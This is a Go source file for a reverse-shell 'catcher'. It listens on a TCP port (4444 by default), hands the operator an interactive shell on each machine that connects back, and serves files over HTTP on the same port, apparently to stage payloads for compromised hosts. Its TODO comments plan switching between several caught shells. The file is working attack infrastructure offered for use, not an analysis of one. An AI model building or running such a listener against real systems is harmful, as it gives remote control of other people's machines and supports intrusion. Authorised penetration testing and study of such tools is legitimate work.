package main

import (
    "fmt"
    "net"
    "os"
    "net/http"
    "bufio"
    "io"
    "math/rand"
    "time"
    "bytes"
    "strings"
    "flag"
    "path/filepath"
)

const (
    CONN_TYPE = "tcp"
    BUFFERSIZE = 1024
)

// TODO:
// - add menu with prefix
//      - prefix :
//      - action: help, list/ls, switch/s <id based on list>
// - add a way to switch between reverse shells (ie. via menu action)
func main() {
    rand.Seed(time.Now().UnixNano())

    var port int
    flag.IntVar(&port, "p", 4444, "Port to listen on")

    var host string
    flag.StringVar(&host, "h", "127.0.0.1", "Host to listen on")

    var directory string
    flag.StringVar(&directory, "d", ".", "Directory you want to serve files from")

    flag.Parse()

    checkDirectoryPath(directory)

    startListener(host, port, directory)
}

func startListener(host string, port int, directory string) {
    ipPort := fmt.Sprintf("%s:%d",host,port)
    // Listen for incoming connections.
    l, err := net.Listen(CONN_TYPE, ipPort)
    if err != nil {
        fmt.Println("Error listening:", err.Error())
        os.Exit(1)
    }
    // Close the listener when the application closes.
    defer l.Close()
    fmt.Printf(":: Catcher listening on %s\n:: Serving directory %s\n", ipPort, directory)
    for {
        // Listen for an incoming connection.
        conn, err := l.Accept()
        if err != nil {
            fmt.Println("Error accepting: ", err.Error())
            os.Exit(1)
        }
        // Handle connections in a new goroutine.
        go handleTcpConn(conn, directory)
    }
}

func handleHTTPRequest(req *http.Request, conn net.Conn, directory string) {
    fp := req.URL.EscapedPath()

    // Note: This means files with . at the end won't work..
    // I'd rather do it that way for sec reasons
    // can be updated later if need be
    fp = strings.Trim(fp, "./")

    fp = filepath.Join(directory, fp)
    fmt.Printf(":: HTTP request for file: %s \n", fp)

    file, err := os.Open(fp)
    if err != nil {
        fmt.Println(err)
        _, err = conn.Write([]byte("HTTP/1.1 404 NOT FOUND\n\n\n"))
        return
    }
    fileInfo, err := file.Stat()
    if err != nil {
        fmt.Println(err)
        return
    }
    _, err = conn.Write([]byte(fmt.Sprintf("HTTP/1.1 200 OK\nContent-type: application/octet-stream\nContent-Length: %d\n\n",fileInfo.Size())))

    sendBuffer := make([]byte, BUFFERSIZE)
    for {

        _, err = file.Read(sendBuffer)
        if err == io.EOF {
            break
        }
        conn.Write(sendBuffer)
    }
    _, err = conn.Write([]byte("\n\n"))
}

func handleTcpConn(conn net.Conn, directory string) {

    defer conn.Close()
    isFirstRequest := true
    writerInitialiased := false

    connId := conn.RemoteAddr().String()

    buf := make([]byte, 1024)

    // set timeout for first request
    err := conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        n, err := conn.Read(buf)
        if err != nil {
            if netErr, ok := err.(net.Error); ! (ok && netErr.Timeout()) {
                fmt.Println(err)
                return
            }
        }

        // assume that it can't be a HTTP request after first packet
        // otherwise we might have fp when you cat a file with an http request inside
        if isFirstRequest {
            err := conn.SetReadDeadline(time.Time{})
            if err != nil {
                fmt.Println(err)
                return
            }
            isFirstRequest = false
            b := bytes.NewReader(buf)
            bio := bufio.NewReader(b)
            req, err := http.ReadRequest(bio)

            if err == nil {
                handleHTTPRequest(req, conn, directory)
                return
            }
        }

        if !writerInitialiased {
            go func() {
                for {
                    reader := bufio.NewReader(os.Stdin)
                    text, _ := reader.ReadString('\n')

                    _, err := conn.Write([]byte(text))
                    if err != nil {
                        fmt.Println("write messed up", err.Error())
                        return
                    }
                }
            }()
            writerInitialiased = true
        }

        if n > 0 {
            fmt.Printf("[%s] :: %s", connId, buf[:n])
        }
    }
}

func checkDirectoryPath (dp string) {
    info, err := os.Stat(dp)
    if os.IsNotExist(err) {
        fmt.Printf("%s does not exist\n", dp)
        os.Exit(1)
    }

    if !info.IsDir() {
        fmt.Printf("%s is not a directory\n", dp)
        os.Exit(1)
    }
}


